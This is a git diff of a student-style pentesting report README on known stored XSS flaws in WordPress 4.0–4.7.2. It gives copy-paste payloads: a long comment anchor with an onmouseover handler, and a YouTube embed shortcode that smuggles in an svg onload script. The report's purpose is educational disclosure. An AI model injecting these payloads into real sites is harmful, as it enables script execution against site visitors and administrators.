@@ -2,7 +2,7 @@
 
 Time spent: 10 hours spent in total
 
-> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress
+> Objective: Find, analyze, recreate, and document three vulnerabilities affecting an old version of WordPress
 
 ## Pentesting Report
 
@@ -15,17 +15,19 @@ Time spent: 10 hours spent in total
   - [x] Steps to recreate: 
     - Copy and paste this payload and post it in the comment: <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
   - [ ] Affected source code:
-1. (Required) WordPress  4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
+2. (Required) WordPress  4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
   - [x] Summary: 
     - Vulnerability types: XSS
     - Tested in version: 4.0-4.7.2
     - Fixed in version: 
-  - [ ] GIF Walkthrough: 
-  - [ ] Steps to recreate: 
+  - [x] GIF Walkthrough:http://i.imgur.com/EIPLH79.gif 
+  - [x] Steps to recreate: 
     - Copy and paste this payload into a new post: [embed src='https://youtube.com/embed/11111\x3csvg onload=alert(1)\x3e'][/embed]
   - [ ] Affected source code:
-    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
-1. (Required) Vulnerability Name or ID
+    - [Link 1](https://developer.wordpress.org/reference/functions/do_shortcode/)
+    - [Link 2](https://developer.wordpress.org/reference/functions/wp_embed_register_handler/)
+    - [Link 3](https://developer.wordpress.org/reference/classes/wp_embed/autoembed/)
+3. (Required) Vulnerability Name or ID
   - [ ] Summary: 
     - Vulnerability types:
     - Tested in version:
